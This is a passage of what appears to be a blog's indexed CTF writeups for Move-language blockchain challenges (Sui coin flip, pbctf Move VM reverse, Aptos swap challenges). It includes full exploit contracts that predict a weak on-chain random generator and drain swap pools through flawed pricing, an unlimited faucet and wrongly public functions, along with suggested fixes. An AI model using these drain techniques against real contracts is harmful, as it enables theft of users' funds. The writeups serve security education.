b\"\\x78\\x00\\xa7\\x02\\x0e\\x00\\x29\\x01\\xa4\\x01\\x78\\x00\") Out[2]: (120, 679, 14, 297, 420, 120) Based on the calorie settings for each ingredient in the contract source code, we can deduce the recipe for the first burger as follows: Bun, Mayo, Lettuce, Chicken Schnitzel, Cheese, Bun. Similarly, we can derive the recipe for the second one. Using the ChefCapability permission to “create” the individual components of the hamburgers, we can represent both hamburgers using two wrapper structs and then proceed with the delivery of the orders. modulesolution::mc_chicken_solution{// [*] Import dependencies usesui::tx_context::TxContext;usechallenge::mc_chicken;struct Order1Burgerhasstore,drop{bun: mc_chicken::Bun,mayo: mc_chicken::Mayo,lettuce: mc_chicken::Lettuce,chicken_schnitzel: mc_chicken::ChickenSchnitzel,cheese: mc_chicken::Cheese,bun2: mc_chicken::Bun,}struct Order2Burgerhasstore,drop{bun: mc_chicken::Bun,cheese: mc_chicken::Cheese,cheese2: mc_chicken::Cheese,chicken_schnitzel: mc_chicken::ChickenSchnitzel,cheese3: mc_chicken::Cheese,chicken_schnitzel2: mc_chicken::ChickenSchnitzel,cheese4: mc_chicken::Cheese,chicken_schnitzel3: mc_chicken::ChickenSchnitzel,cheese5: mc_chicken::Cheese,cheese6: mc_chicken::Cheese,bun2: mc_chicken::Bun,}// [*] Public functions publicfunsolve(chef: \u0026mutmc_chicken::ChefCapability,order1: \u0026mutmc_chicken::Order,order2: \u0026mutmc_chicken::Order,ctx: \u0026mutTxContext){letburger1=Order1Burger{bun: mc_chicken::get_bun(chef),mayo: mc_chicken::get_mayo(chef),lettuce: mc_chicken::get_lettuce(chef),chicken_schnitzel: mc_chicken::get_chicken_schnitzel(chef),cheese: mc_chicken::get_cheese(chef),bun2: mc_chicken::get_bun(chef),};mc_chicken::deliver_order(chef,order1,burger1,ctx);letburger2=Order2Burger{bun: mc_chicken::get_bun(chef),cheese: mc_chicken::get_cheese(chef),cheese2: mc_chicken::get_cheese(chef),chicken_schnitzel: mc_chicken::get_chicken_schnitzel(chef),cheese3: mc_chicken::get_cheese(chef),chicken_schnitzel2: mc_chicken::get_chicken_schnitzel(chef),cheese4: mc_chicken::get_cheese(chef),chicken_schnitzel3: mc_chicken::get_chicken_schnitzel(chef),cheese5: mc_chicken::get_cheese(chef),cheese6: mc_chicken::get_cheese(chef),bun2: mc_chicken::get_bun(chef),};mc_chicken::deliver_order(chef,order2,burger2,ctx);}} ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:4:2","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Challenge 4: Coin Flip Challenge Info It’s all about luck … they say … Host: metatrustctf.sui.io Port: 31340 Source: https://github.com/MetaTrustLabs/ctf/tree/master/coinFlip Score: 200 ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:5:0","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Target contract In this challenge, the author has created a coin flipping game that requires users to consecutively guess correctly 12 times in a row. It’s worth noting that the randomness of the coin flips is not provided through VRF (Verifiable Random Function) but is generated using a custom-defined LCG (Linear Congruential Generator) to produce random numbers. /* https://github.com/MetaTrustLabs/ctf/blob/master/coinFlip/framework/chall/sources/coin_flip.move#L38-L50 */publicentryfuncreate_game(stake: Coin\u003cSUI\u003e,randomness: u64,fee: u8,ctx: \u0026mutTxContext){letgame=Game{id: object::new(ctx),stake: stake,combo: 0,fee: fee,player: RANDOM_ADDRESS,author: tx_context::sender(ctx),randomness: new_generator(randomness),solved: false,};transfer::public_share_object(game);}/* https://github.com/MetaTrustLabs/ctf/blob/master/coinFlip/framework/chall/sources/coin_flip.move#L90-L97 */funnew_generator(seed: u64): Random{Random{seed}}fungenerate_rand(r: \u0026mutRandom): u64 {r.seed=((((9223372036854775783u128*((r.seedasu128))+999983)\u003e\u003e1)\u00260x0000000000000000ffffffffffffffff)asu64);r.seed} ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:5:1","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Solution If we carefully examine the code for creating the game within the framework, we can observe that the seed for the LCG is actually just a u8. Therefore, we can potentially predict the outcome of the coin flips by brute-forcing this seed, with a 1/256 chance of guessing the correct seed. /* https://github.com/MetaTrustLabs/ctf/blob/master/coinFlip/framework/src/main.rs#L74-L82 */letmutcreate_args: Vec\u003cSuiValue\u003e=Vec::new();letmutrng=rand::thread_rng();letrandom_byte: u8 =rng.gen();println!(\"Random Seed: {}\",random_byte);letcreate_args_1=SuiValue::Object(FakeID::Enumerated(3,0),None);letcreate_args_2=SuiValue::MoveValue(MoveValue::U64(random_byteasu64));letcreate_args_3=SuiValue::MoveValue(MoveValue::U8(10)); Is there a more elegant way to obtain the seed without resorting to brute-force cracking? The answer is yes. Although Move language restricts us from accessing struct’s fields defined in the Foo module within the Bar module under normal circumstances, there’s a clever workaround, which involves using the BCS encoding. /* https://github.com/MetaTrustLabs/ctf/blob/master/coinFlip/framework/chall/sources/coin_flip.move#L22-L35 */struct Randomhasdrop,store,copy{seed: u64 }struct Gamehaskey,store{id: UID,stake: Coin\u003cSUI\u003e,combo: u8,fee: u8,player: address,author: address,randomness: Random,solved: bool,} Recalling what we mentioned earlier, BCS encoding only serializes and concatenates the underlying types within a struct. In the case of the Game, after serializing it, if we read the ninth-to-last byte (skipping the 1 byte for solved and the 7 high-order bytes for seed), we will obtain the least significant byte of game.randomness.seed. Once we have this seed, we can use the same LCG as in the challenge to generate random numbers and predict the outcomes, achieving a 100% correct guessing rate. modulesolution::coin_flip_solution{// [*] Import dependencies usesui::tx_context::TxContext;usechallenge::coin_flip;usesui::coin::{Self,Coin};usesui::sui::SUI;usestd::bcs;usestd::vector;struct Randomhasdrop,store,copy{seed: u64 }// [*] Public functions publicentryfunsolve(game: \u0026mutcoin_flip::Game,balance: Coin\u003cSUI\u003e,ctx: \u0026mutTxContext){letbytes: vector\u003cu8\u003e=bcs::to_bytes(game);letsecret=*vector::borrow(\u0026bytes,vector::length(\u0026bytes)-9);letr=new_generator((secretasu64));letround=0;letfee=coin::split(\u0026mutbalance,10,ctx);coin_flip::start_game(game,fee,ctx);while(round\u003c11){letguess=generate_rand(\u0026mutr)%2;round=round+1;coin_flip::play_game(game,(guessasu8),coin::split(\u0026mutbalance,10,ctx),ctx);};letguess=generate_rand(\u0026mutr)%2;coin_flip::play_game(game,(guessasu8),balance,ctx);}funnew_generator(seed: u64): Random{Random{seed}}fungenerate_rand(r: \u0026mutRandom): u64 {r.seed=((((9223372036854775783u128*((r.seedasu128))+999983)\u003e\u003e1)\u00260x0000000000000000ffffffffffffffff)asu64);r.seed}} ","date":"2023-09-19","objectID":"/2023/09/MetaTrust-CTF-Sui/:5:2","tags":["Web3","CTF","Move"],"title":"2023 MetaTrust Web3 Security CTF Sui Challenges Writeup","uri":"/2023/09/MetaTrust-CTF-Sui/"},{"categories":["Web3"],"content":"Writeup for the reverse challenge - Move VM in pbctf 2023","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Preface This weekend, I participated in the pbctf 2023 and got the first blood for the reverse challenge Move VM. Here is a brief writeup for this challenge. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:1:0","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Challenge Info Challenge Info Attachment: message.mv Solves: 6 Score: 383 In this challenge, we are given a message.mv file, which is a serialized Move module. As this is a reverse challenge, we need to reverse the module, analyze the algorithm that checks the flag and finally calculate the flag. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:2:0","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Disassemble the module It’s relatively easy to disassemble Move bytecode by reusing some code from the official disassembler. usestd::fs;usemove_binary_format::file_format::CompiledModule;usemove_binary_format::binary_views::BinaryIndexedView;usemove_ir_types::location::Spanned;usemove_disassembler::disassembler::{Disassembler,DisassemblerOptions};usemove_bytecode_source_map::mapping::SourceMapping;fn main(){letbytecode_bytes=fs::read(\"message.mv\").expect(\"Unable to read bytecode file\");letmodule=CompiledModule::deserialize(\u0026bytecode_bytes).expect(\"Module blob can't be deserialized\");letbiview=BinaryIndexedView::Module(\u0026module);letmapping=SourceMapping::new_from_view(biview,Spanned::unsafe_no_loc(()).loc).expect(\"Unable to build dummy source mapping\");letmutdisassembler_options=DisassemblerOptions::new();disassembler_options.print_code=true;disassembler_options.only_externally_visible=false;disassembler_options.print_basic_blocks=true;disassembler_options.print_locals=true;letdisassembler=Disassembler::new(mapping,disassembler_options);letdissassemble_string=disassembler.disassemble().expect(\"Unable to dissassemble\");println!(\"{}\",dissassemble_string);} By compiling and running the above code, we can get the move bytecode instructions in a readable format. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:3:0","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Analyze the algorithm Before analyzing the algorithm, we need to understand the semantics of the Move bytecode instructions. Since the instructions set is not complicated and the names are self-explanatory, one can easily understand the semantics of each instruction referring to the source code of the Move interpreter. From the signature of the check_flag function, we can see that the function takes a vector\u003cu8\u003e as input which should be the flag. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:4:0","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Format Check B0: 0: ImmBorrowLoc[0](Arg0: vector\u003cu8\u003e) 1: StLoc[41](loc40: \u0026vector\u003cu8\u003e) 2: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 3: VecLen(3) 4: LdU64(58) 5: Neq 6: BrFalse(11) B1: 7: LdU8(255) 8: LdU8(1) 9: Add 10: Pop B2: ... The first 2 basic blocks are used to check the length of the input vector. If the length is not 58, the program will jump to the basic block B2 and trigger an error. B2: 11: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 12: LdU64(0) 13: VecImmBorrow(3) 14: ReadRef 15: CastU64 16: LdU8(48) 17: Shl 18: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 19: LdU64(1) 20: VecImmBorrow(3) 21: ReadRef 22: CastU64 23: LdU8(40) 24: Shl 25: BitOr 26: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 27: LdU64(2) 28: VecImmBorrow(3) 29: ReadRef 30: CastU64 31: LdU8(32) 32: Shl 33: BitOr 34: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 35: LdU64(3) 36: VecImmBorrow(3) 37: ReadRef 38: CastU64 39: LdU8(24) 40: Shl 41: BitOr 42: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 43: LdU64(4) 44: VecImmBorrow(3) 45: ReadRef 46: CastU64 47: LdU8(16) 48: Shl 49: BitOr 50: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 51: LdU64(5) 52: VecImmBorrow(3) 53: ReadRef 54: CastU64 55: LdU8(8) 56: Shl 57: BitOr 58: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 59: CopyLoc[41](loc40: \u0026vector\u003cu8\u003e) 60: VecLen(3) 61: LdU64(1) 62: Sub 63: VecImmBorrow(3) 64: ReadRef 65: CastU64 66: LdU8(0) 67: Shl 68: BitOr 69: LdU64(29670774015617385) 70: Xor 71: LdU64(7049012482871828) 72: Neq 73: BrFalse(78) B3: 74: LdU8(255) 75: LdU8(1) 76: Add 77: Pop Recall that in the previous code snippet, the flag is stored in loc40, so the logic of the code above is checking if $(flag[0] \\ll 48 | flag[1] \\ll 40 | flag[2] \\ll 32 | flag[3] \\ll 24 | flag[4] \\ll 16 | flag[5] \\ll 8 | flag[len(flag)]) \\oplus 29670774015617385 == 7049012482871828$, where $flag[i]$ is the $i$-th byte of the flag. If the condition is not satisfied, the program will jump to the basic block B3 and trigger an error. By solving the above equation, we can get the flag format: flag[0:6] = ‘pbctf{’ and flag[-1] = ‘}’. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:4:1","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Simple Stack Machine After the format check, the program will jump to the basic block B4 and execute the following instructions. B4: 78: LdConst[0](Vector(U64): [252, 1, 1, 0, 0, 0, 0, 0, 0, 0, 30, 0, 0, 0, 64, 0, 0, 0, ... , 0, 0, 0, 0, 69, 0, 0, 0]) 79: StLoc[5](loc4: vector\u003cu64\u003e) 80: ImmBorrowLoc[5](loc4: vector\u003cu64\u003e) 81: StLoc[39](loc38: \u0026vector\u003cu64\u003e) 82: VecPack(4, 0) 83: StLoc[6](loc5: vector\u003cu64\u003e) 84: MutBorrowLoc[6](loc5: vector\u003cu64\u003e) 85: StLoc[46](loc45: \u0026mut vector\u003cu64\u003e) 86: LdU64(0) 87: StLoc[45](loc44: u64) B5: 88: CopyLoc[45](loc44: u64) 89: CopyLoc[39](loc38: \u0026vector\u003cu64\u003e) 90: VecLen(4) 91: Lt 92: BrFalse(539) B6: 93: Branch(94) B7: 94: CopyLoc[39](loc38: \u0026vector\u003cu64\u003e) 95: CopyLoc[45](loc44: u64) 96: VecImmBorrow(4) 97: ReadRef 98: StLoc[43](loc42: u64) 99: CopyLoc[43](loc42: u64) 100: LdU8(32) 101: Shr 102: LdU64(255) 103: BitAnd 104: CastU8 105: StLoc[44](loc43: u8) 106: MoveLoc[43](loc42: u64) 107: LdU64(4294967295) 108: BitAnd 109: CastU64 110: StLoc[42](loc41: u64) 111: CopyLoc[44](loc43: u8) 112: LdU8(0) 113: Eq 114: BrFalse(119) In B4, the program loaded a const vector loc4 and stored its reference in loc38. Then the program initialized an empty vector loc5 and stored its mutable reference in loc45. Finally, the program initialized a variable loc44 to 0. In B5, the program checked if loc44 is less than the length of loc38. If not, the program will jump to B539 and exit the program. Otherwise, the program will jump to B6. In B7, the program loaded the loc44-th element of loc38 as a U64 value and stored the 25-32 bits of the value in loc43 as a U8 value. Then the program stored the 33-64 bits of the U64 value in loc41 as a U64 value. Finally, the program checked if loc43 is 0. If not, the program will jump to L119. After some analysis, we found that the program is a simple stack machine. loc38 is the program running in the stack machine. loc44 is the program counter. loc45 is the stack. loc43 is the opcode of the current instruction and loc41 is the argument. Note that the vector in loc38 should be interpreted as a vector of U64 values, we should remove the first 2 bytes which is metadata of the vector and then unpack the remaining bytes into U64 values. struct.unpack(\"\u003c252Q\", bytes(program[2:])) ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:4:2","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Reverse the stack machine It’s tedious to reverse the stack machine, so we omit the details here. The following shows its logic in Python. target = [2209421562, 4020009855, 2511570847, 825727845, 2747945899, 2434240953, 3923412385, 1510700589, 3658116609, 1210550661, 2892531646, 648401340, 2537403886] def encrypt(x): for _ in range(8): x = (x\u003e\u003e1)^((((x\u00261)^0xffffffff)+1)\u00260xfff63b78) return x flag = ['?']*58 for i in range(6, len(flag), 4): assert encrypt(encrypt(encrypt(encrypt(flag[i])^flag[i+1])^flag[i+2])^flag[i+3]) == target[i//4-1] At first glance, the encrypt function is a linear function similar to CRC. After some analysis, we found that it actually is a Galois LFSR. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:4:3","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Solve the LFSR Take advantage of the property of LFSR, we can solve the LFSR by the code below. target = [2209421562, 4020009855, 2511570847, 825727845, 2747945899, 2434240953, 3923412385, 1510700589, 3658116609, 1210550661, 2892531646, 648401340, 2537403886] def inv_lfsr(x): for _ in range(8): if x \u0026 0x80000000: x = ((x ^ 0xfff63b78) \u003c\u003c 1) ^ 0x1 else: x \u003c\u003c= 1 return x flag = b'' for part in target: flag += inv_lfsr(inv_lfsr(inv_lfsr(inv_lfsr(part)))).to_bytes(4, 'little') print(flag) ''' b'enjoy haccing blockchains? work for Zellic:pepega:!}' ''' So the flag is pbctf{enjoy haccing blockchains? work for Zellic:pepega:!}. ","date":"2023-02-19","objectID":"/2023/02/PBCTF-Move-VM/:4:4","tags":["Web3","CTF","Move"],"title":"PBCTF 2023 Move VM Writeup","uri":"/2023/02/PBCTF-Move-VM/"},{"categories":["Web3"],"content":"Writeup for CTF MOVEment with Aptos Dec 2022","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Preface It’s been half a year since I last wrote a blog. During that time, I’ve learned a lot about Web3 security, including Solana and Aptos. Last weekend, I participated in the CTF MOVEment with Aptos Dec 2022 jointly organized by MoveBit, Aptos, ChainFlag and OtterSec, and scored two first-bloods and two second-bloods in the four challenges except the sanity-check, ranking first in the end. In this post, I will briefly introduce the solutions to the five challenges. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:1:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 1: checkin Challenge Info Source: https://github.com/movebit/ctfmovement-1 Link: http://47.243.227.164:20000/web/ Score: 100 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:2:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract The challenge 1 is a sanity-check to let players get familiar with how to use aptos-cli to communicate with the private chain where the challenge contract is deployed. There is a get_flag function in the contract, and once it’s called it will emit an Flag event. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:2:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Solution After initializing an account and invoking the get_flag function via aptos-cli, we can submit the transaction hash to the challenge website, the server will check whether this transaction triggers the Flag event, and if so, the server will return the flag. aptos init --assume-yes --network custom --rest-url http://8.218.146.10:9080 --faucet-url http://8.218.146.10:9081 aptos move run --assume-yes --function-id VICTIM_ADDRESS::checkin::get_flag ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:2:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 2: hello move Challenge Info Source: https://github.com/movebit/ctfmovement-2 Link: http://47.243.227.164:20001/web/ Score: 200 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:3:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract The challenge 2 is a simple challenge to let players get familiar with the Move language. The contract has five functions: init_challenge, hash, discrete_log, add, pow and get_flag. The init_challenge function is used to initialize the challenge by sending the caller a Challenge object with 5 members, balance=10, q1=false, q2=false, q3=false, and an event handler. q1, q2, q3 indicates the solving status of the 3 sub-problems in this challenge, and these status will be checked in the get_flag function. q1: hash q1 will be set to true if we invoke the hash function and provide a guess: vector\u003cu8\u003e satisfying len(guess)==4 \u0026\u0026 keccak256(guess+\"move\")==\"d9ad5396ce1ed307e8fb2a90de7fd01d888c02950ef6852fbc2191d2baf58e79\". This can be solved by writing a simple script to brute-force all the possible guesses, and the answer is good. q2: discrete_log In order to set q2 to true, we need to provide a guess: u128 satisfying pow(10549609011087404693, guess, 18446744073709551616) == 18164541542389285005, which is a classic discrete logarithm problem. We can solve this with discrete_log(18164541542389285005,Mod(10549609011087404693,18446744073709551616)) in sage, and the answer is $3123592912467026955$. q3: add The sub-problem q3 is more interesting. Similar to other checked arithmetic implementation, the Shl and Shr operations in Move language will raise an ARITHMETIC_ERROR if the shift amount is greater than or equal to the bit width of the operand as this is a cpu-level undefined behavior. And the Shl operations won’t raise ARITHMETIC_ERROR if there is an overflow. So we can shift the current balance $10$ to the left by more than $8$ bits to set the balance to $0$. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:3:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution2{usestd::signer;usestd::vector;usectfmovement::hello_move;publicentryfunsolve(account: \u0026signer){hello_move::init_challenge(account);hello_move::hash(account,vector[103,111,111,100]);hello_move::discrete_log(account,3123592912467026955);hello_move::add(account,3,5);hello_move::add(account,3,5);hello_move::get_flag(account);}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:3:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 3: swap empty Challenge Info Source: https://github.com/movebit/ctfmovement-3 Link: http://47.243.227.164:20002/web/ Score: 200 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract This target contract implements a very simple swap protocol, which allows users to swap between two tokens Coin1 and Coin2. The contract has a get_coin function to let the user get an airdrop of $5$ Coin1 and $5$ Coin2, two functions swap_12 and swap_21 to swap between Coin1 and Coin2, and a get_flag function checks whether the amount of Coin1 or Coin2 in the reserved account is 0. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Vulnerability The vulnerability is the design of the get_amouts_out function. This contract uses a very naive way of calculating the amount of token that can be exchanged based on the ratio of Coin1 and Coin2 in the reserve account. However, this design is not safe, consider the following POC: Attacker get $5$ Coin1 and $5$ Coin2 from airdrop User: $5$ Coin1, $5$ Coin2; Reserve: $50$ Coin1, $50$ Coin2 Attacker swap $5$ Coin2 to $5\\cdot\\frac{50}{50}=5$ Coin1 User: $10$ Coin1, $0$ Coin2; Reserve: $45$ Coin1, $55$ Coin2 Attacker swap $10$ Coin1 to $10\\cdot\\frac{55}{45}=12$ Coin2 User: $0$ Coin1, $12$ Coin2; Reserve: $55$ Coin1, $43$ Coin2 Attacker swap $12$ Coin2 to $12\\cdot\\frac{55}{43}=15$ Coin1 User: $15$ Coin1, $0$ Coin2; Reserve: $40$ Coin1, $55$ Coin2 … By repeating this process, a malicious user could drain almost all the tokens in the reserved accounts. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution3{usestd::signer;usestd::vector;useaptos_framework::coin::{Self,Coin};usectfmovement::pool::{Self,Coin1,Coin2};publicentryfunsolve(account: \u0026signer){pool::get_coin(account);letcoin2=coin::withdraw\u003cCoin2\u003e(account,5);letcoin1=pool::swap_21(\u0026mutcoin2,5);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin1=coin::withdraw\u003cCoin1\u003e(account,10);letcoin2=pool::swap_12(\u0026mutcoin1,10);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin2=coin::withdraw\u003cCoin2\u003e(account,12);letcoin1=pool::swap_21(\u0026mutcoin2,12);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin1=coin::withdraw\u003cCoin1\u003e(account,15);letcoin2=pool::swap_12(\u0026mutcoin1,15);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin2=coin::withdraw\u003cCoin2\u003e(account,20);letcoin1=pool::swap_21(\u0026mutcoin2,20);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);letcoin1=coin::withdraw\u003cCoin1\u003e(account,24);letcoin2=pool::swap_12(\u0026mutcoin1,24);coin::deposit\u003cCoin2\u003e(signer::address_of(account),coin2);coin::deposit\u003cCoin1\u003e(signer::address_of(account),coin1);pool::get_flag(account);}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:3","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Possible fix One possible fix is to use the following formula to calculate the number of tokens that can be exchanged, to ensure that the product of the two token amounts is always constant: publicfunget_amouts_out(pool: \u0026LiquidityPool,amount: u64,order: bool): u64 {let(token1,token2)=get_amounts(pool);if(order){return(amount*token2)/(token1+amount)}else{return(amount*token1)/(token2+amount)}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:4:4","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 4: simple swap Challenge Info Source: https://github.com/movebit/ctfmovement-4 Link: http://47.243.227.164:20003/web/ Score: 300 ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:0","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Target contract This contract implements a Uniswap v2 like coin swap program that allows users to swap between TestUSDC and SimpleCoin with a $0.25%$ fee rate and a $0.1%$ bonus if a user swaps TestUSDC to SimpleCoin. In the initialization process, the admin added $10^{10}$ TestUSDC and $10^{10}$ SimpleCoin to the pool. The get_flag function will check if the user has at least $10^{10}$ SimpleCoin, if so, the user will get the flag. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:1","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Vulnerability There are two vulnerabilities in this contract. The first vulnerability is that there is no limit on the amount of tokens that a user can claim via airdrop. An attacker can claim a large amount of tokens and then swap them to other tokens to drain the reserve pool. The second vulnerability is that the swap_exact_x_to_y_direct and swap_exact_y_to_x_direct functions are incorrectly exposed to the public. An attacker can call this function to swap tokens without paying the fee. Combining these two vulnerabilities, an attacker could first claim a large amount of TestUSDC and then swap an amount of TestUSDC equal to the current reserve pool for SimpleCoin each time to drain half of the reserve pool while receiving a $0.1%$ bonus. After $n$ repetitions, the amount of SimpleCoin in the reserve pool will be reduced to $10^{10}\\cdot\\frac{1}{2^n}$. ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:2","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Exploit contract modulesolution::solution4{usestd::signer;usestd::vector;usectfmovement::simple_coin::{Self,SimpleCoin,CoinCap,TestUSDC};usectfmovement::swap::{Self,LPCoin};useaptos_framework::coin::{Self,BurnCapability,MintCapability,FreezeCapability,Coin};publicentryfunsolve(account: \u0026signer){simple_coin::claim_faucet(account,1000000000000000000);swap::check_or_register_coin_store\u003cSimpleCoin\u003e(account);letbase=10000000000;leti=0;while(i\u003c20){lettusdc=coin::withdraw\u003cTestUSDC\u003e(account,base);let(simple_coin,simple_coin_reward)=swap::swap_exact_y_to_x_direct\u003cSimpleCoin,TestUSDC\u003e(tusdc);coin::deposit\u003cSimpleCoin\u003e(signer::address_of(account),simple_coin);coin::deposit\u003cSimpleCoin\u003e(signer::address_of(account),simple_coin_reward);base=base*2;i=i+1;};simple_coin::get_flag(account);}} ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:3","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Possible fix Add a limit to the airdrop amount each account can claim Remove the public visibility modifier of the swap_exact_x_to_y_direct\u003cX, Y\u003e function to make it private ","date":"2022-12-14","objectID":"/2022/12/CTF-Movement-Aptos/:5:4","tags":["Web3","CTF","Move"],"title":"CTF MOVEment with Aptos Dec 2022 Writeup","uri":"/2022/12/CTF-Movement-Aptos/"},{"categories":["Web3"],"content":"Challenge 5: move lock v2 